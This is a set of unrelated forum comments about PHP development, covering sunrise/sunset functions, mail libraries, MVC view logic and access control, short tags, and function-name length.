Ha! A coworker wrote some complicated scripts to figure it out based on lat/long of the user's location. There was some error and in the scripts that was making the time anywhere from a few minutes to 20 minutes off. Suddenly, we found these functions. Dozens of wasted man-hours later, our sunrise/sunset functions actually work.
My thoughts exactly. mail() was included as a base to compare against, and PHPMailer and Zend_Mail both perform quite favourably IMO. Swift seems to be a bit of a hog however... I feel it's good to know all the implications of adding a library to your project, so I like to do little tests like this :)
&gt; First of all, LatLngBounds is not an array of LatLng points, it only consists of two: the north-east corner and the south-west corner. My fault, I was writing while talking. Yes, it handles 2 points. &gt; Ew, API bleed-over. Don't do this. Yep, we'll remove that. &gt; Which has the potential to screw up the calculations. It is much better to do calculations in standard SI-units, then transform the result of that calculation into whatever unit you're interested in. We had that discussion in our team. We may remove the setter and add two public methods instead: toKm($meters) and toMiles($meters) or maybe just one method to convert from meters to other length units such as convertMetersTo($unitName). What do you think? Referring to the suggested magic method __toString(), we're not modifying the classes since it would require [php &gt; 5.2.0 to work properly](http://stackoverflow.com/a/2902646/1273027). We prefer wider compatibility and no bad surprises! Thanks for your feedback! 
I can't really agree with most of this in a practical standpoint. The view is concerned with _what gets shown_, but that doesn't mean all logic should be separated from it. The way I see it, the logic in the controller decides what is allowed while the view decides what goes shown. In your first paragraph, you suggest that logic shouldn't exist in the view, and that just doesn't make sense to me. What if I have one link that shouldn't appear in the view because the user is not an admin? You have to have a permissions check to show that. That logic doesn't belong in the model either. "Hey Model, do I show this link?" No, no, that logic belongs in the view. Usually I have a generic Permissions model/class that handles the fetching of data about permissions, while the controller and/or view makes decisions about what to do with the data. Models should only represent data -- the controller (which is defined as, you know, the thing that controls) makes the decision about what to DO with the data, and the view (which is defined as, you know, the thing that we see) makes the decision about what to SHOW about the data. In my app, for instance, we have the Permissions class which the User model inherits. At any time i can access the user permissions by checking $user-&gt;_permission-&gt;(permission). If it's true, then they have permission, and if they don't, then they don't. That permission is available anywhere a user is available -- whether that's the model, the controller or the view. For _access control_, I tend to place the logic in the controller to deny back-end access to an action/view/object and in the view to deny the user the ability to even click through to a link. You also suggest that the ACL object be aware of the user's context. This is fine if you always know that a user will be logged in, but sometimes you run scripts that are outside of a session (cron jobs, manual scripts, etc), and you might not always have a session for which the ACL is aware of the context. In those scenarios, the ACL would generally fail, unless you built in some way to custom define the user object (either by accessing the ACL via the user object, a la $user-&gt;can('edit_article') or by passing in the user as a parameter, a la Permissions::can('edit_article', $user)) And finally, as OCD as you seem to be about separating the contexts of models, views and controllers, you don't seem to have the same OCDness about separating the job duties of your workers. In my view, designers should be, you know, designing. They should live in Photoshop and flow charts and whiteboards. Programmers should be doing all the coding. Now I know that's not feasible, but again, any "designer" who also programs should be able to navigate basic logic structures in a view (anything more complicated than basic if statements and for loops should be in a controller to begin with). Anyway, that's my two cents. Edit: I should add that I don't use CodeIgniter (though I have in the past), and I have never used anything Zend before. I tend to build my own stuff from scratch to fit whatever project I have in mind, though I do have a basic framework (custom) that I use to jump-start things.
BUT PYTHON IS BETTER AND IF YOU CAN'T USE RAILS ON A LINUX MACHINE YOU ARE WORTHLESS
Like SQL Server drivers or code or what?
&gt;&lt;form method="&lt;?php echo $method; ?&gt;" action="&lt;?php echo $self; ?&gt;" enctype="&lt;?php echo $enctype; ?&gt;"&gt; &lt;?php echo '&lt;form method="', $method, '" action="', $self, '" enctype="', $enctype, '"&gt;'; ?&gt; Probably even shorter than your short tags. But who cares about keystrokes, right?
**No**, not necessarily. The PHP tag is (i.e. "&lt;?php" or "&lt;?") is mandatory in a PHP file almost all of the time (only saying "almost" since I'm not aware of a situation where you wouldn't but do not want to entirely exclude the possibility). The need for the XML header ("&lt;?xml" ...) is likely **always** less than the frequency of the PHP tag in a PHP file (assuming you don't use the XML header in *every single* PHP file you write) and assuming you aren't redundant in how you organize your XML and data files that require PHP functionality. That being said, I'm willing to bet that the frequency of occurrences in manually typed "&lt;?**php**" over those wordy XML headers is ***much*** greater to easily compensate for the extra typing needed for the XML header. That's if you take into account all PHP files you need to manually type, particularly those involving native PHP template use (i.e. for "foreach" loops, if statements, etc) in MVC settings or even just those being used as the start of PHP files that don't even incorporate any HTML/XML data.
Yes. All our templates have "&lt;?php print" in them, because we can't control what our users do on their servers, and as it's an FOSS project, it can't afford the support burden to tell all of those users to either change their server settings or upgrade PHP. Many of them don't even have those options.
Awesome find!
I'd fire anyone that put that in a view file. Why would you even do something like that? That's astraw man argument if there ever was one. Showing a code example no sane person would actually use to prove a point is not going to win you any awards.
Awesome! Thanks for pointing this out at just the right time. I can totally use this in something I'm working on right now!
i need to be able to set gmtoffset in half hour blocks
&gt; You mean that two people said Really? Only two people? I'm seeing a dozen or more comments in support of short tags. &gt; Because that is all all three of those comments said. Because brevity is the primary reason to use short tags. There's not much else to it. &gt; It's easier to remember, not because it's faster to type. That's not correct at all. * [http://stackoverflow.com/questions/7448262/why-are-c-names-shortened](http://stackoverflow.com/questions/7448262/why-are-c-names-shortened) * faster typing, faster reading, more code fits on one screen so you can see more code at once * Overly verbose names are not readable. Lines become &gt;80 characters (which is not just a terminal limit but a human readability issue) and must be wrapped, leading to too little fitting on the screen. * as I understand it typing stringConcatenation on such a beast was significantly more difficult than typing strcat * [http://kazimirmajorinc.blogspot.com/2009/01/short-or-long-function-names.html](http://kazimirmajorinc.blogspot.com/2009/01/short-or-long-function-names.html) * it is easier to remember long name. And it is especially easier to explain programs to other people if functions have long, descriptive names. (**The exact opposite of what you're saying**) * long names are counterproductive - code is longer, and it takes more time to write it. * Plus, Rasmus (ya know, the guy that created PHP) has said he chose short function names *[because they're easier to type](http://marc.info/?l=php-internals&amp;m=110730205722060&amp;w=2)*. * Yeah, I really don't care what the name of the function is. Wanted to try to keep it somewhat short since it might need to be typed a lot. Honestly, I'll let you google the topic on your own. Having function names that are "easier to remember" is not a reason for the shortness of the function names. Do you think jQuery aliased the jQuery() function to $() because $() was easier to remember? No, they did it to save a lot of typing. Brevity is important in the world of programming. I'm shocked at the number of people tossing aside the brevity answer like it's meaningless.